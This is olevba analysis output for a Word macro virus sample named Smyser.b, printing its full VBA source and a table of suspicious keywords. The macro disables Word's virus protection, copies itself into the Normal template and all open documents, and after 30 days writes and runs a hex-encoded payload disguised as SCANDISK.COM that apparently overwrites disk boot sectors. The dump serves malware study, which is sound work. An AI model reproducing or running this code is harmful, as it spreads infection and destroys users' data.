olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Smyser.b-3f53fe6ecd320cf670b9a5378520cac94c32b338
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Smyser.b-3f53fe6ecd320cf670b9a5378520cac94c32b338 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'5/3/04
'30/04/2004
'20/04/2004
'2003/9/4
Private Sub Document_Open()
'Anti-Smyser'
'A.T.P Ver 1.2
    On Error Resume Next
    Application.Options.VirusProtection = False
    Dim CodeStr As String: CodeStr = "B9040051BB0002B80102B90100BA8000CD13597308B400CD13E2E8EB2BB90002BE00028A04F6D08804464975F6B9040051BB0002B80103B90100BA8000CD13597306B400CD13E2E831C0CD21"
    Dim i As Integer, b As Byte, f As Integer, fn As String, s As String, det As Date
    If Mid(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) <> Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) Or Val(Right(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) < Val(Right(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then f = FreeFile: fn = Environ("TEMP") & "\~$WM" & Year(Date) & Month(Date) & Day(Date) & ".tmp": Open fn For Output As #f: Print #f, Chr(39) & Date: Print #f, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(2, ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1): Close #f: NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile fn: Kill fn
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    Dim Doc As Document, PreSaved As Boolean, Cloned As Boolean
    For Each Doc In Application.Documents
        PreSaved = Doc.Saved And (Doc.Path <> "") And Not Doc.ReadOnly: Cloned = False
        If Mid(Doc.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) <> Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) Or Val(Right(Doc.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) < Val(Right(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) Then Doc.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Doc.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If Doc.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then f = FreeFile: fn = Environ("TEMP") & "\~$WM" & Year(Date) & Month(Date) & Day(Date) & ".tmp": Open fn For Output As #f: Print #f, Chr(39) & Date: Print #f, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(2, ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1): Close #f: Doc.VBProject.VBComponents.Item(1).CodeModule.AddFromFile fn: Kill fn: Cloned = True
        If Cloned And PreSaved Then f = FreeFile: fn = Doc.Path & "\~$" & Doc.Name: Err.Clear: Open fn For Output As f: If Err.Number = 0 Then Close f: Kill fn: Doc.Save
    Next Doc
    s = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 1): Mid(s, 1, 1) = " ": det = s: If Date > det + 30 Then fn = Environ("TEMP") & "\SCANDISK.COM": f = FreeFile: Open fn For Binary Access Write As f: For i = 1 To Len(CodeStr) Step 2: b = CByte("&H" & Mid(CodeStr, i, 2)): Put f, , b: Next i: Close f: Shell fn, 6: Date = det
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

